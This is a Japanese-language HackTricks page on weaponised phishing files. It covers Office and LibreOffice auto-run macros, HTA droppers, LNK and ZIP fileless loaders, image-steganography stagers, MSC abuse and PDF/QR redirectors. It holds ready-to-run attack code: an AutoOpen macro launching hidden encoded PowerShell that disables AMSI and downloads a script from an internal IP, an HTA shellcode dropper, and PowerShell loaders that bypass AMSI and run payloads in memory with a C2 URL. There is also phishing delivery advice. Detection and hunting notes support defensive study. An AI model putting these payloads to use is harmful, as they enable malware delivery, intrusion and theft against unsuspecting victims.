# Phishing Files & Documents

{{#include ../../banners/hacktricks-training.md}}

## Office Documents

Microsoft Wordは、ファイルを開く前にファイルデータの検証を行います。データ検証は、OfficeOpenXML標準に基づいてデータ構造を識別する形で行われます。データ構造の識別中にエラーが発生すると、解析対象のファイルは開かれません。

通常、マクロを含むWordファイルには`.docm`拡張子が使われます。ただし、ファイル拡張子を変更して名前を変えても、マクロを実行する機能は維持できます。\
たとえば、RTFファイルは設計上マクロをサポートしていませんが、DOCMファイルの拡張子をRTFに変更しても、Microsoft Wordで処理され、マクロを実行できます。\
同じ内部構造と仕組みは、Microsoft Office Suiteのすべてのソフトウェア（Excel、PowerPointなど）に当てはまります。

次のコマンドを使うと、一部のOfficeプログラムで実行される拡張子を確認できます。

```bash
assoc | findstr /i "word excel powerp"
```

DOCXファイルがマクロを含むリモートテンプレート（File –Options –Add-ins –Manage: Templates –Go）を参照している場合、マクロを「実行」することもできます。

### 外部画像の読み込み

次の手順に進みます: _挿入 --> クイックパーツ --> フィールド_\
_**分類**: リンクと参照、**フィールド名**: includePicture、**ファイル名または URL**: _ http://<ip>/whatever

![Officeドキュメント - 外部画像の読み込み: 次の手順に進みます: 挿入 -- クイックパーツ -- フィールド](<../../images/image (155).png>)

### マクロのバックドア

マクロを使用して、ドキュメントから任意のコードを実行できます。

#### 自動読み込み関数

一般的な関数ほど、AVに検出される可能性が高くなります。

- AutoOpen()
- Document_Open()

#### マクロのコード例

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```

#### メタデータを手動で削除する

**File > Info > Inspect Document > Inspect Document** に移動すると、Document Inspector が表示されます。**Inspect** をクリックし、**Document Properties and Personal Information** の横にある **Remove All** をクリックします。

#### Doc 拡張子

完了したら、**Save as type** ドロップダウンを選択し、形式を **`.docx`** から Word 97-2003 **`.doc`** に変更します。\
これは、**`.docx` には macro を保存できない**うえ、macro 対応の **`.docm`** 拡張子には**不審に思われる**傾向があるためです（例：サムネイルアイコンに大きな `!` が表示され、一部の Web／メールゲートウェイでは完全にブロックされます）。そのため、この**旧式の `.doc` 拡張子が最善の妥協案**です。

#### Malicious Macros Generators

- MacOS
  - [**macphish**](https://github.com/cldrn/macphish)
  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT の自動実行マクロ (Basic)

LibreOffice Writer ドキュメントには Basic マクロを埋め込み、**Open Document** イベントにマクロを割り当てることで、ファイルを開いたときに自動実行できます（Tools → Customize → Events → Open Document → Macro…）。<sup>[[1]](#references)</sup> シンプルな reverse shell マクロは次のようになります：

```vb
Sub Shell
    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```

文字列内の二重引用符（`""`）に注意してください。LibreOffice Basic ではリテラルの引用符をエスケープするために使われるため、`...==""")` で終わる payloads では、内側のコマンドと Shell 引数の両方で引用符の対応が取れます。

配信のヒント:

- `.odt` として保存し、ドキュメントのイベントに macro を割り当てて、開いたときにすぐ実行されるようにします。
- `swaks` でメールを送信する場合は、`--attach @resume.odt` を使います（添付ファイルとしてファイルの内容を送信し、ファイル名文字列を送らないようにするには、`@` が必要です）。これは、検証なしで任意の `RCPT TO` 受信者を受け入れる SMTP サーバーを悪用する際に重要です。

## HTAファイル

HTA は、**HTML とスクリプト言語（VBScript や JScript など）を組み合わせた** Windows プログラムです。ユーザーインターフェイスを生成し、ブラウザーのセキュリティモデルによる制約を受けずに「完全に信頼された」アプリケーションとして実行されます。

HTA は **`mshta.exe`** を使って実行されます。通常、これは **Internet Explorer とともにインストール**されるため、**`mshta` は IE に依存します**。そのため、アンインストールされていると、HTA は実行できません。

```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
  Function var_func()
  	var_shellcode = "<shellcode>"

  	Dim var_obj
  	Set var_obj = CreateObject("Scripting.FileSystemObject")
  	Dim var_stream
  	Dim var_tempdir
  	Dim var_tempexe
  	Dim var_basedir
  	Set var_tempdir = var_obj.GetSpecialFolder(2)
  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
  	var_obj.CreateFolder(var_basedir)
  	var_tempexe = var_basedir & "\" & "evil.exe"
  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
  	For i = 1 to Len(var_shellcode) Step 2
  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
  	Next
  	var_stream.Close
  	Dim var_shell
  	Set var_shell = CreateObject("Wscript.Shell")
  	var_shell.run var_tempexe, 0, true
  	var_obj.DeleteFile(var_tempexe)
  	var_obj.DeleteFolder(var_basedir)
  End Function

  var_func
  self.close
</script>
```

## HTMLメール内の偽の添付ファイルカード

HTMLメールは、実際の添付ファイルを含めずに、メールプロバイダー標準の添付ファイルプレビューカードを模倣できます。Talosは、Base64エンコードされた4つのインラインPNG MIMEパートから再構築されたGmailカードを確認しました。カード全体は1つのアンカーで囲まれており、`?m=<target-id>` の受信者値によって受信者ごとのトラッキングが可能になっていました。リンクは `http://` や `https://` ではなく `//` で始まっていました。このプロトコル相対形式はブラウザーでは解決されますが、完全修飾URLのみを照合するURL抽出ツールでは見落とされる可能性があります。<sup>[[11]](#references)</sup>

分析時には、描画された添付ファイル一覧を信頼せず、raw MIMEを調べてください。インライン画像パートがどのようにカードの見た目を構成しているかを再構築し、カードを囲むアンカーを特定してから、URLを抽出する前にプロトコル相対の `href` 値を正規化してください。<sup>[[11]](#references)</sup>

エンベロープ／ヘッダーの送信者なりすましとDMARCアライメントのテストについては、[SMTP mail spoofing countermeasures](../../network-services-pentesting/pentesting-smtp/index.html#spf-pass-with-an-unaligned-visible-sender)を参照してください。

## NTLM Authenticationの強制

**リモートからNTLM Authenticationを強制する**方法はいくつかあります。たとえば、ユーザーがアクセスするメールやHTMLに**不可視の画像**を追加できます（HTTP MitMでも可能？）。または、**フォルダーを開くだけで**Authenticationを**トリガーする**ファイルの**アドレス**を被害者に送る方法もあります。

**これらの方法やその他のアイデアについては、以下のページを確認してください:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

ハッシュやAuthenticationを盗むだけでなく、**NTLM relay攻撃を実行する**こともできる点を忘れないでください。

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIPに埋め込まれたPayload（fileless chain）

非常に効果的なキャンペーンでは、正規の偽装文書（PDF/DOCX）2つと悪意のある .lnk を含むZIPが配信されます。仕掛けは、実際のPowerShell loaderがZIPのraw bytes内の一意なmarker以降に格納されており、.lnkがそこから切り出して、すべてメモリ内で実行することです。<sup>[[2]](#references)</sup>

.lnkのPowerShell one-linerで実装される一般的な流れ:

1) よくあるパス（Desktop、Downloads、Documents、%TEMP%、%ProgramData%、および現在の作業ディレクトリの親ディレクトリ）から元のZIPを見つける。
2) ZIPのバイト列を読み込み、ハードコードされたmarker（例: xFIQCV）を見つける。marker以降のすべてが埋め込まれたPowerShell payload。
3) ZIPを%ProgramData%にコピーして展開し、正規のファイルに見せかけるため偽装用の.docxを開く。
4) 現在のプロセスでAMSIをバイパスする: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) 次のstageの難読化を解除（例: #文字をすべて削除）し、メモリ内で実行する。

埋め込まれたstageを切り出して実行するPowerShellの例:

```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
  "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
  "$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```

注記
- 配信では、信頼性の高いPaaSサブドメイン（例：*.herokuapp.com）が悪用されることが多く、ペイロードの配信を制限する場合もあります（IP/UAに応じて無害なZIPを配信するなど）。
- 次のステージでは、base64/XOR shellcodeを復号し、Reflection.Emit + VirtualAllocを使って実行することがよくあります。これにより、ディスク上に残る痕跡を最小限に抑えます。

同じチェーンで使用されるPersistence
- Microsoft Web Browser controlのCOM TypeLib hijackingにより、IE/Explorerや、このコントロールを埋め込んだアプリがペイロードを自動的に再起動するようにします。<sup>[[2]](#references)[[4]](#references)</sup> 詳細とすぐに使えるコマンドはこちらを参照してください：

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

ハンティング/IOCs
- アーカイブデータの末尾にASCIIマーカー文字列（例：xFIQCV）が付加されたZIPファイル。
- 親フォルダーやユーザーフォルダーを列挙してZIPを探し、おとり文書を開く.lnk。
- [System.Management.Automation.AmsiUtils]::amsiInitFailedによるAMSI tampering。
- 信頼できるPaaSドメイン上のリンクで終わる、長期間続く業務関連スレッド。

## LNKでおとりを先に表示 → scheduled taskによるPersistence → 信頼できるCPLのサイドローディング

よく見られる別のパターンは、**文書を装った`.lnk`**が、バックグラウンドで実際のチェーンを準備しながら、無害なおとりをすぐに開くものです。<sup>[[3]](#references)</sup>

確認されたワークフロー：
1. ショートカットは**PDFを装い**、`conhost.exe`などのプロキシを使って、難読化されたPowerShell downloaderを起動します。
2. PowerShellは、明らかなトークン（`iw''r`、`g''c''i`、`r''e''n`、`c''p''i`、`&(g''cm sch*)`）を断片化するため、`iwr`、`gci`、`ren`、`cpi`、`schtasks`を探す単純な検出をすり抜けます。
3. stagerは**おとり文書を先にダウンロード**して被害者に開かせ、その後、バックグラウンドで悪意のあるファイルを再構成します。
4. ペイロードは**偽装用の拡張子**で書き込まれ、余分な文字を削除してから名前が変更されることがあります。これにより、明らかな`.exe` / `.cpl`ファイルが現れるのを遅らせます。
5. ユーザーが書き込み可能なパスにある信頼できるホストバイナリを起動する、**分単位で実行されるscheduled task**によってPersistenceを確立します。

このパターンをハンティングするための最小限の手掛かり：

```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```

認識しておくと役立つステージング構成:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` または `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### 第2段階がステルス性に優れている理由

Rapid7のケーススタディでは、スケジュールされたタスクが **`Fondue.exe`** を `C:\Users\Public\` から繰り返し起動していました。**`APPWIZ.cpl`** が同じ場所に配置され、**`RunFODW`** をエクスポートしていたため、信頼されたMicrosoftバイナリは正規のシステムコピーではなく、攻撃者のCPLをサイドロードしました。

CPLは以下の処理を行います:
- `C:\Windows\Tasks\editor.dat` から **AES-256-CBC** のblobを読み込む
- **Windows CNG / `bcrypt.dll`** を通じて復号する
- 実行可能メモリを確保し、復号したshellcodeをコピーする
- shellcodeのポインターを **`EnumUILanguagesW`** のコールバックとして渡し、間接的に実行する

最後の手順は、個別に検出対象とする価値があります。マルウェアは、直接 `((void(*)())buf)()` とジャンプするのを避け、**正規のコールバックを受け取るWinAPI** を悪用して実行を移すことがよくあります。

このキャンペーンで復号されたペイロードは **Donut** shellcodeで、最終PEを完全にメモリ内にマッピングし、実行を引き渡す前に、現在のプロセスで **AMSI/WLDP/ETW** にパッチを適用しました。サイドローディングとメモリ常駐型の後処理について詳しくは、以下を参照してください:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

実践的な検出の着眼点:
- `.lnk` が `powershell.exe` または `conhost.exe` を起動し、その後に目に見えるデコイ文書が表示される。
- **`C:\Users\Public\`** への短時間のダウンロード後、意味のない拡張子から直ちにリネームされる。
- `GoogleErrorReport` のような目立たない名前のスケジュールされたタスクが、**ユーザーが書き込み可能なディレクトリ** から実行される。
- 信頼されたバイナリが、同じ非システムディレクトリから **`.cpl` / `.dll`** ファイルを読み込む。
- **`C:\Windows\Tasks\`** 配下にBase64テキストのblobが書き込まれ、その後サイドロードされたモジュールによって読み込まれる。

## 画像内のステガノグラフィー区切りペイロード (PowerShell stager)

最近のloaderチェーンでは、難読化されたJavaScript/VBSが配信され、それがBase64のPowerShell stagerをデコードして実行します。このstagerは画像 (多くの場合GIF) をダウンロードします。画像には、固有の開始／終了マーカー間にプレーンテキストとして隠された、Base64エンコード済みの.NET DLLが含まれています。スクリプトはこれらの区切り文字 (実環境で確認された例: «<<sudo_png>> … <<sudo_odt>>>») を検索し、その間のテキストを抽出してBase64デコードし、バイト列に変換します。その後、アセンブリをメモリ内にロードし、既知のエントリーメソッドをC2 URLとともに呼び出します。<sup>[[5]](#references)</sup>

ワークフロー
- ステージ1: アーカイブされたJS/VBS dropper → 埋め込みBase64をデコード → `-nop -w hidden -ep bypass` を指定してPowerShell stagerを起動。
- ステージ2: PowerShell stager → 画像をダウンロードし、マーカーで区切られたBase64を切り出して.NET DLLをメモリ内にロードし、C2 URLとオプションを渡してそのメソッド (例: VAI) を呼び出す。
- ステージ3: Loaderが最終ペイロードを取得し、通常はプロセスホローイングによって信頼されたバイナリ (一般的にはMSBuild.exe) にインジェクトする。<sup>[[7]](#references)[[8]](#references)</sup> プロセスホローイングと、信頼されたユーティリティを介したプロキシ実行について詳しくは、こちらを参照してください:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

画像からDLLを切り出し、.NETメソッドをメモリ内で呼び出すPowerShellの例:

<details>
<summary>PowerShellステゴペイロード抽出・ローダー</summary>

```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
  [string]$Url    = 'https://example.com/payload.gif',
  [string]$StartM = '<<sudo_png>>',
  [string]$EndM   = '<<sudo_odt>>',
  [string]$EntryType = 'Loader',
  [string]$EntryMeth = 'VAI',
  [string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```

</details>

注記
- これは ATT&CK T1027.003（steganography/marker-hiding）です。<sup>[[6]](#references)</sup> マーカーはキャンペーンごとに異なります。
- アセンブリをロードする前に、AMSI/ETW bypass と文字列の難読化解除が一般的に行われます。
- ハンティング: ダウンロードされた画像を既知の区切り文字でスキャンし、画像にアクセスして直ちに Base64 blob をデコードする PowerShell を特定します。

stego ツールや carving techniques も参照してください:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

繰り返し見られる初期ステージは、アーカイブ内で配信される、小規模で高度に難読化された `.js` または `.vbs` ファイルです。その唯一の目的は、埋め込まれた Base64 文字列をデコードし、`-nop -w hidden -ep bypass` を指定して PowerShell を起動し、HTTPS 経由で次のステージを開始することです。<sup>[[5]](#references)</sup>

骨組みとなるロジック（抽象化）:
- 自身のファイルの内容を読み取る
- ジャンク文字列の間にある Base64 blob を見つける
- ASCII の PowerShell にデコードする
- `wscript.exe`/`cscript.exe` から `powershell.exe` を呼び出して実行する

ハンティングの手がかり
- アーカイブされた JS/VBS 添付ファイルが、コマンドラインで `-enc`/`FromBase64String` を指定して `powershell.exe` を起動する。
- ユーザーの temp パスから `wscript.exe` が `powershell.exe -nop -w hidden` を起動する。

## 実行コンテナーとしての MSC ドキュメント（GrimResource）

Microsoft Management Console ファイル（`.msc`）は、通常 `mmc.exe` で開く XML コンソール定義です。**GrimResource** は `StringTable` 参照を悪用し、古い XSS primitive を含む `apds.dll` リソースを参照させます。そのため、ユーザーが細工されたコンソールを開くと、JavaScript が `mmc.exe` 内で実行されます。確認されたサンプルでは、`transformNode` ベースの難読化と **DotNetToJScript** を組み合わせ、通常の Office マクロ経由の手法を使わずに .NET payload をインスタンス化していました。<sup>[[9]](#references)</sup>

静的トリアージでは、信頼できない MSC はテキストとして扱い、**ダブルクリックしないでください**。<sup>[[9]](#references)</sup>

```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```

高シグナルのランタイム上の着目点は、`mmc.exe` による CLR またはスクリプトコンポーネントの読み込み、ネットワーク接続の作成、あるいは `powershell.exe`、`cmd.exe`、`wscript.exe`、`cscript.exe`、`mshta.exe`、`rundll32.exe`、または予期しない実行ファイルの起動です。この形式自体は正規のものなので、検知ではすべての MSC をブロックするのではなく、**送信元 + 不審な XML/スクリプトの内容 + `mmc.exe` の挙動**を関連付けるべきです。<sup>[[9]](#references)</sup>

## PDF/QR リダイレクターとペイロードの選別

PDFは、役立つためにエクスプロイトを必要としません。最近のキャンペーンでは、無害そうな文書に**QRコードまたは通常のリンク**を配置し、ブラウザーのセッションをメールの制御から切り離し、宛先を受信者のメールアドレスに合わせて個別化しています。Microsoftは、受信者ごとに固有のQR URLを含み、RaccoonO365の認証情報窃取インフラにつながる2025年のPDFを報告しました。並行して使われた別のチェーンでは、IP/環境による判定を用い、選別された訪問者にはJavaScript/MSIへのパスを返す一方、スキャナーや許可されていないクライアントには無害なPDFを返していました。<sup>[[10]](#references)</sup>

PDFのアクションとレンダリングされたQRコードの両方をトリアージします。QRコードは抽出可能な画像として保存されず、ベクター描画されている場合があります。そのため、埋め込み画像の抽出に加え、すべてのページをラスタライズしてください：

```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```

隔離された分析システムから、認証せずにデコード後の宛先とリダイレクトを調査します。有用なハンティングの手掛かりには、メール本文がほぼ空のQRコードのみを含むPDF、クエリパラメーターに埋め込まれた受信者のメールアドレス、評判の良いホスティングサービスを経由する複数のリダイレクト、IP、ジオロケーション、Cookie、リファラー、ユーザーエージェントに応じて異なるコンテンツが返されることなどがあります。単一のsandbox fetchではデコイしか取得できない場合があるため、条件を制御したプロファイルでリクエストを比較します。<sup>[[10]](#references)</sup>

## NTLMハッシュを窃取するためのWindowsファイル

**NTLM creds を窃取できる場所**のページを確認してください:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – LibreOfficeマクロ → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – ZipLineキャンペーン: 米国企業を標的とする高度なフィッシング攻撃](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: 中国をテーマにしたローダーチェーンを通じてDropping Elephantの手口を追跡](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – 新たなCOM永続化手法 (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loaderが複数の情報窃取マルウェアを配信](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – ステガノグラフィ (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – プロセスハロウイング (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – 信頼された開発者ユーティリティのプロキシ実行: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource: 初期アクセスと回避にMicrosoft Management Consoleを利用](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – 脅威アクターが納税シーズンを利用して税金をテーマにしたフィッシングキャンペーンを展開](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
- [11] [Cisco Talos – UAT-11587の配信チェーンとAntinoバックドア](https://blog.talosintelligence.com/china-nexus-uat-11587-targets-government-and-policy-organizations-across-asia-with-antino-backdoor/)
{{#include ../../banners/hacktricks-training.md}}
